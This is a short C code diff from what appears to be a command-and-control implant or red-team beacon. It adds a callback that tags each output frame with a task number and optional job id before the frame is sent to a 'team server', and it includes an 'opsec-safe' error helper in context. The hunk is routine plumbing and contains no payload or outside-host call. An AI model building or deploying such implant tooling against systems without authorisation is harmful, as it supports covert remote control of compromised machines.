@@ -177,7 +177,42 @@ void command_shell_chunk_maybe(char * buffer, int blength, int type) {
  * larger chunks are split up assuming the response buffer is empty. Let's not go
  * there. The two code paths keeps this clear and easy to understand (for now?)
  */
-void command_shell_callback(char * buffer, int length, int type);
+/* Every output frame goes through here. One that belongs to a task carries
+ * the task number behind the callback word - a job's frame the job's id
+ * too (commands.h). The tag is put in front of chunking and queueing, so
+ * a chunked frame is rebuilt on the team server with it in place. */
+static void put_be32(char * p, unsigned int v) {
+	v = htonl(v);
+	memcpy(p, &v, 4);
+}
+
+void command_shell_callback(char * buffer, int length, int type) {
+	task_out task;
+	char * framed = NULL;
+
+	if (output_task(&task)) {
+		int n = 4;
+		framed = (char *)malloc((size_t)length + 8);
+		if (framed != NULL) {
+			put_be32(framed, task.task_no);
+			if (task.has_job) {
+				put_be32(framed + 4, task.job_id);
+				n = 8;
+				type |= JOB_TAG;
+			}
+			if (length > 0)
+				memcpy(framed + n, buffer, (size_t)length);
+			buffer = framed;
+			length += n;
+			type |= TASK_TAG;
+		}
+	}
+	command_shell_send(buffer, length, type);
+	if (framed != NULL) {
+		memset(framed, 0, (size_t)length);
+		free(framed);
+	}
+}
 
 /* post an error in an opsec-safe way */
 void post_error_generic(int error, int arg1, int arg2, char * arg3) {
